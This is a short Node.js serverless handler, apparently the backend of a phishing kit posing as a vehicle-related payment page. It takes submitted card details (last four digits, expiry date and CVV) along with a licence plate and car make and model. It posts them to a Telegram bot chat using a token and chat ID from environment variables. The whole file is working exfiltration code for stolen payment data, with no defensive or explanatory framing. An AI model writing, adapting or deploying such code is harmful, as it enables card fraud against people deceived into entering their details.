module.exports = async (req, res) => {
    // السماح فقط بـ POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const paymentData = req.body;
        const botToken = process.env.BOT_TOKEN;
        const chatId = process.env.CHAT_ID;

        if (!botToken || !chatId) {
            console.error("[v0] Missing BOT_TOKEN or CHAT_ID");
            return res.status(500).json({ error: 'Configuration error' });
        }

        // تنسيق الرسالة للإرسال إلى Telegram
        const message = `
📋 بيانات دفع جديدة:
━━━━━━━━━━━━━━━━
🚗 رقم التسجيل: ${paymentData.plaque}
🏷️ الماركة: ${paymentData.marque}
🚙 الموديل: ${paymentData.modele}
💳 البطاقة (آخر 4): ${paymentData.cardNumber.slice(-4)}
📅 الانتهاء: ${paymentData.expiry}
🔐 CVV: ${paymentData.cvv}
⏰ الوقت: ${paymentData.timestamp}
━━━━━━━━━━━━━━━━
        `;

        // إرسال الرسالة إلى Telegram
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error('Failed to send Telegram message');
        }

        console.log("[v0] Payment data sent to Telegram successfully");
        return res.status(200).json({ success: true, message: 'تم إرسال البيانات بنجاح' });

    } catch (error) {
        console.error("[v0] Error in send-payment:", error);
        return res.status(500).json({ error: error.message });
    }
};
